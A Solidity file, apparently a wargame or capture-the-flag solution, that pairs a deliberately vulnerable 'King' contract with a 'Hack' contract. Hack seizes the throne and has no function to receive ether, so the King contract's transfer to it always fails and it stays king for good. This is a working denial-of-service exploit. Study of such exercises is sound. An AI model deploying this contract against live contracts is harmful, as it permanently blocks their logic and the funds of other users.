// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
the hack contract does not accept money
and the receive method does not selfdestruct
so if after using transfer, we cant send money, 
the tx will fail and there wont be a new king 
*/

contract Hack{
    constructor(address payable kingaddress) payable {
kingaddress.call{value:msg.value}("");
    }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}